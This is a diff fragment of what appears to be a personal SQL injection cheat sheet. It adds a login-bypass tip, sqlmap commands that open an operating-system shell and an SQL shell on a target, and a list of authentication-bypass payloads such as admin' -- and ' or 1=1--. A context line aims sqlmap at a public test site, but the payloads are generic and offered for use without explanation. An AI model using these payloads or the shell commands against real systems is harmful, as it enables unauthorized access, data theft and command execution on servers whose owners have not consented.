@@ -24,3 +24,6 @@ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --cookie='JSESSIONID
SQL Injection

in login page enter blah' or 1=1-- as username and click login without entering the password

OS Shell = sqlmap -u 'url' --dbms=mysql --os-shell
SQL Shell = sqlmap -u 'url' --dbms=mysql --sql-shell
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1—
